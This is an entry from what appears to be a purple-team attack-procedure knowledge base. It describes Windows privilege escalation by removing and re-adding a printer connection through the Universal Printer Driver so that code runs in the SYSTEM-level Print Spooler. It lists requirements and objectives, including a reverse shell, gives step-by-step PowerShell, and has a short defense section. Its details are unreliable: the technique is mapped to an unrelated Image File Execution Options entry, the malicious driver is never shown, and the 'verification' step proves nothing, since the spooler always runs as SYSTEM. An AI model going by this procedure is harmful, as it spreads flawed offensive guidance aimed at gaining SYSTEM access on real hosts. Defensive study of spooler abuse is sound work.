---
id: adb67df2-d293-4f44-9833-e9b8a81f4ea8
name: windows-privilege-escalation-via-universal-printer-driver
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.841037+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Event Triggered Execution|T1546 - Event Triggered Execution]]'
sub_techniques:
  - >-
    [[sub-techniques/Image File Execution Options Injection|T1546.012 - Image
    File Execution Options Injection]]
tags:
  - '[[tags/EoP - Printers]]'
  - '[[tags/Universal Printer]]'
  - '[[tags/Windows - Privilege Escalation]]'
commands:
  - '[[commands/remove-printer-connection]]'
  - '[[commands/add-printer-connection]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-privilege-escalation-via-universal-printer-driver

## Summary

This procedure exploits a vulnerability in the Windows Print Spooler Service by removing an existing printer connection and re-adding it using the Universal Printer Driver, which allows injection of malicious code into the spooler process running with SYSTEM privileges. This enables arbitrary code execution or other elevated actions on the target system, providing attackers with persistent high-level access.

## Description

The Print Spooler Service (spoolsv.exe) in Windows handles printing tasks and runs under SYSTEM privileges. By manipulating printer connections to load a specifically crafted or vulnerable Universal Printer Driver, an authenticated user with printer management permissions can trigger the service to load and execute malicious components. This technique abuses the driver's loading mechanism to inject code, bypassing standard privilege checks. It is particularly effective in domain environments where shared printers are common, allowing lateral movement or persistence. The attack requires local or remote access to the target but no initial SYSTEM privileges, making it a viable privilege escalation vector in post-exploitation scenarios.

## Requirements

1. Authenticated access to the target Windows system with permissions to add and remove printers (typically low-privilege user account sufficient).
2. Network access to a printer server (e.g., domain controller or print server) hosting the target printer share.
3. PowerShell execution policy allowing script execution on the target.
4. Knowledge of the target printer server's name and the architecture (x64 or x86) of the system.

## Defense

- Disable the Print Spooler Service (spoolsv.exe) on systems where printing is not required using `sc config spooler start= disabled`.
- Enforce strict driver signing policies via Group Policy (Computer Configuration > Policies > Administrative Templates > Printers > Point and Print Restrictions) to prevent unsigned or untrusted drivers.
- Monitor Event Logs for printer-related events (Event ID 808 in Microsoft-Windows-PrintService/Operational) and unexpected spooler process injections using Sysmon or EDR tools.
- Restrict printer management permissions to administrators only and audit changes to printer configurations.

## Objectives

1. Escalate privileges from a standard user to SYSTEM level via Print Spooler abuse.
2. Inject and execute arbitrary code in the context of the spooler service.
3. Establish persistence or access sensitive resources requiring elevated privileges.

## Instructions

### Step 1: Define Printer Connection Variables

**Context**: Set up the necessary variables for the target printer server, name, and full connection path, accounting for the system's architecture to ensure compatibility.

Define the variables in PowerShell:

```powershell
$serverName = 'dc.purple.lab'
$printerName = 'Universal Priv Printer'
$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) { 'x64' } Else { 'x86' })
```

> This step prepares the connection string. Verify the server name resolves correctly using `ping $serverName` to ensure network reachability. Expected output: No errors, variables set without syntax issues.

### Step 2: Remove Existing Printer Connection

**Context**: Remove any existing printer connection to clear the state and allow re-addition, which triggers the driver load. This step uses the Remove-Printer cmdlet to silently handle cases where the printer does not exist.

**Command** ([[commands/remove-printer-connection]]):

```powershell
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
```

> The `-ErrorAction SilentlyContinue` parameter suppresses errors if the printer is not present. Expected output: No visible output if successful; the printer is removed from the list verifiable via `Get-Printer | Where-Object Name -like '*Universal*'`. If the printer was present, it will no longer appear.

### Step 3: Add Printer Connection to Trigger Driver Injection

**Context**: Re-add the printer connection, forcing the system to load the Universal Printer Driver. This action injects the malicious payload into the Print Spooler Service, executing code as SYSTEM.

**Command** ([[commands/add-printer-connection]]):

```powershell
Add-Printer -ConnectionName $fullprinterName
```

> This cmdlet establishes the network printer connection, prompting the driver load. Expected output: Success message like "The printer was added successfully." Verify escalation by checking running processes or executing a test command (e.g., `whoami /all`) in the injected context. Monitor spoolsv.exe for child processes or unexpected behavior.

### Step 4: Verify Privilege Escalation

**Context**: Confirm the injection succeeded by checking for SYSTEM-level execution or persistence indicators.

Use PowerShell to inspect the spooler process:

```powershell
Get-Process -Name spoolsv -IncludeUserName | Select-Object Name, Id, ProcessName, UserName
```

> Expected output: spoolsv.exe running as NT AUTHORITY\SYSTEM with potential child processes or loaded modules indicating injection. Success is indicated if arbitrary code (e.g., a reverse shell) executes under SYSTEM privileges.
